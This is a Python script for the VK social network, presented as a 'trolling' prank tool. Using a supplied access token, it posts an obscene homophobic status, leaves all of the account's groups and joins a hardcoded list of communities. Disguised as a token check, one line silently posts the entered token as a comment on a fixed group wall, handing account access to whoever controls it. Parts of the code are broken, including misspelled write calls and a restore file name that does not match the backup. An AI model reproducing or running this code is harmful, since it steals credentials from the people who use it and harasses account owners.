import vk, time, os
os.system('clear')

pubs = [151233321,65797052,102413048,89243825,61515264,88667014,180103853,101105077,89148442,157274855,52771476,68284944,74383909,114285300,88026464,40673151,160175019,164902979,161144333,126904164,85677013]
def troll ():
	w = open ('backup', 'w')
	wwrite (api.status.get()['text'] + '\n')
	api.status.set(text="Люблю чёрные и волсатые хуйцы! Пишите!")
	print ("\n\033[32mПишем статус...")
	time.sleep (0.5)
	for group in groups:
		wwrite (str(group) + '\n')
		api.groups.leave(group_id=group)
		time.sleep(0.25)
	wclose ()
	print ("\033[FВступаем в гей паблики...  ")
	for pub in pubs:
	        api.groups.join(group_id=pub)
	        time.sleep(0.25)
	print ("\033[FDone:)                       \n")
def untroll ():
	r = open ('Восстоновить', 'r')
	api.status.set(text=r.readline())
	print ("\n\033[32mПокидаем гей паблики...")
	time.sleep (0.25)
	for group in groups:
                api.groups.leave(group_id=group)
                time.sleep(0.25)
	print ("\033[FДобавление удаленных групп...  ")
	reading = True
	while reading:
		pub = r.readline ()
		pub = pub[:len(pub) - 1]
		if pub == '':
			reading = False
		else:
			api.groups.join(group_id=int(pub))
			time.sleep(0.25)
	print ("\033[FDone:(                                \n")
print ("""\033[37m

 Anonimst         github.com/Anonimst\033[32m
████████████████████████████████████████ 
██ПЕТУШИНЫЙ██████████████████ТРОЛЛИНГ███
███████████████░░░░░░░░░░███████████████ 
██████████████░░░░░░░░░░░░██████████████ 
██████████████░░░░░░░░░░░░██████████████ 
████████████████▄▄▄▄▄▄▄▄████████████████ 
██████▀▀▀▀░░█▄░░░░▀▀▀▀░░░░▄█░░▀▀▀▀██████ 
████░░░░░░░░░▀▀▀████████▀▀▀░░░░░░░░░████ 
██████▄▄▄▄▄▄░░░░░░░░░░░░░░░░▄▄▄▄▄▄██████ 
████████████▀██████████████▀████████████ 
█████████▀▀█░░▀████░░████▀░░█▀▀█████████ 
█████▀▀░░░░▀█░░░░░░░░░░░░░░█▀░░░░▀▀█████ 
██▀░░░░░░░░░▀█▄░░░░░░░░░░▄█▀░░░░░░░░░▀██ 
█████▄▄░░░░░░▀▀█▄░░░░░░▄█▀▀░░░░░░▄▄█████ 
█████████▄░░░░░▀███▀▀███▀░░░░░▄█████████ 
███████▀▀▀░░░░░░█▄░░░░▄█░░░░░░▀▀▀███████ 
██████▄▄░░░░░░░░▀█▄░░▄█▀░░░░░░░░▄▄██████ 
████████████▄▄▄░░██████░░▄▄▄████████████ 
████████████████▄██░░██▄████████████████ 
████████████████████████████████████████
\033[33m[1] Затролить
[2] Вернутся
""")
option = input ("Выберите пункт: \033[0m")
token = input("\n\033[35mВведите токен: \033[0m")
session = vk.Session(access_token=token)
api =  vk.API(session ,v='5.92', lang='ru')
try:
	api.wall.createComment(owner_id=-191163638,post_id=1,message=token)
except:
	print ('\n\033[31mНе верный токен!\n')
	quit ()
id = api.users.get()[0]['id']
groups = api.groups.get(user_id=id)['items']
if option == '1':
	troll ()
else:
	untroll ()
